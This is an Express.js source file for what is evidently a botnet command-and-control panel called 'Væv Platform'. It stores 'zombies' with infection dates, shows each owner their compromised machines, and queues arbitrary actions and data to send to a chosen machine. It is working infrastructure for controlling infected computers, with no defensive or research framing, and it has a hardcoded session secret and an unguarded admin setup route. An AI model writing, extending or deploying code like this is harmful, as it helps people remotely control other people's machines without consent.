const express = require('express');
const session = require('express-session');
const bcrypt = require('bcrypt')
const bodyparser = require('body-parser');
const uuid = require('uuid');
const path = require('path');
const { Liquid } = require('liquidjs');

const database = require('./database.js').connect();

const app = express();

app.engine('liquid', new Liquid().express());
app.set('views', './views');
app.set('view engine', 'liquid');
app.locals.basedir = path.join(__dirname, 'views');


app.use(express.static('public'));
app.use(bodyparser.json());
app.use(bodyparser.urlencoded({ extended: true }));
app.use(session({
    genid: function(req) {
      return uuid.v4()
    },
    resave: true,
    saveUninitialized: true,
    secret: 'keyboa453 456etrdfggdf 12qewrasdf45w34536345534rd cat'
}));
app.use((req, res, next) => {
	res.set('X-Powered-By', 'Væv Platform 1.0');
    next();
});

app.get('/dashboard/', (req, res) => {
    if(req.session.loggedin !== true)
    {
        res.redirect('/auth/login');
    }
    else
    {
        database.query("SELECT * FROM zombies WHERE owner = ?", [req.session.user.id], function(error, machines, fields) {
            database.query("SELECT * FROM suspicious_activity",  function(error, activity, fields) {
                database.query("SELECT * FROM zombies WHERE owner = ? ORDER BY infected_on DESC LIMIT 5", [req.session.user.id], function(error, recent_machines, fields) {
                    res.status(200).render('dashboard', {user: req.session.user, machines: machines.length, suspicious_activity: activity.length, recent_machines: recent_machines});
                });
            });
        });
    }
})

app.get('/dashboard/machines', (req, res) => {
    if(req.session.loggedin !== true)
    {
        res.redirect('/auth/login');
    }
    else
    {
        database.query("SELECT * FROM zombies WHERE owner = ? ORDER BY infected_on DESC", [req.session.user.id], function(error, machines, fields) {
            res.status(200).render('machines', {user: req.session.user, machines: machines});
        });
    }
});

app.get('/dashboard/machines/:id', (req, res) => {
    if(req.session.loggedin !== true)
    {
        res.redirect('/auth/login');
    }
    else
    {
        database.query("SELECT * FROM zombies WHERE owner = ? AND id = ? LIMIT 1", [req.session.user.id, req.params.id], function(error, machines, fields) {
            if(machines.length >= 1)
            {
                res.status(200).render('machine', {user: req.session.user, machine: machines[0]});
            }
            else
            {
                res.status(404).render('404');
            }
        });
    }
});

app.post('/dashboard/machines/:id/action', (req, res) => {
    if(req.session.loggedin !== true)
    {
        res.redirect('/auth/login');
    }
    else
    {
        database.query("SELECT * FROM zombies WHERE owner = ? AND id = ? LIMIT 1", [req.session.user.id, req.params.id], function(error, machines, fields) {
            if(machines.length >= 1)
            {
                database.query("INSERT INTO actions (id, action, data, zombie) VALUES(?, ?, ?, ?)", [uuid.v4(), req.body.type, req.body.data.toString(), req.params.id], function(error, machines, fields) {
                    if(!error) res.redirect(`/dashboard/machines/${req.params.id}`)
                });
            }
            else
            {
                res.status(404).render('404');
            }
        });
    }
});

app.post('/auth/login', (req, res) => {
    database.query("SELECT * FROM users WHERE username = ?", [req.body.username], function (error, users, fields) {
        if(users.length >= 1)
        {
            const user = users[0];
            bcrypt.compare(req.body.password, user.password, function(err, result) {
                if(result === true)
                {
                    req.session.loggedin = true;
                    req.session.user = user;
                    res.redirect('/dashboard');
                }
            });
        }
        else
        {
          res.redirect('/auth/login');
        }
    });
});

app.get('/auth/login', (req, res) => {
    if(req.session.loggedin === true)
    {
        res.redirect('/dashboard');
    }
    else
    {
        res.status(200).render('login');
    }
});

app.post('/setup', (req, res) => {
    bcrypt.hash(req.body.password, 12, function(err, hash) {
        database.query("INSERT INTO users (id, username, password, role) VALUES(?, ?, ?, ?)", [uuid.v4(), req.body.username, hash, 1], function (error, result, fields) {
            if(error) throw error;

            if(error == 1048)
            {
                res.status(400).json({status: "failure", message: "Please don't null any fields"})
            }

            if(result.affectedRows === 1)
            {
                res.redirect(`/auth/login?ReturnUrl=${req.originalUrl}`);
            }
        });
    });
})

app.get('/setup', (req, res) => {
    database.query("SELECT * FROM users WHERE role = 1", function(error, result, fields) {
        if(result.length == 0)
        {
            res.status(200).render('setup');
        }
        else
        {
            res.redirect('/auth/login');
        }
    });
})

app.get('/', (req, res) => {
    database.query("SELECT * FROM users WHERE role = 1", function(error, result, fields) {
        if(result.length > 0)
        {
            res.redirect('/auth/login');
        }
        else
        {
            res.redirect('/setup');
        }
    });
});

app.listen(8080, () => {
    console.log('[væv] started listening')
});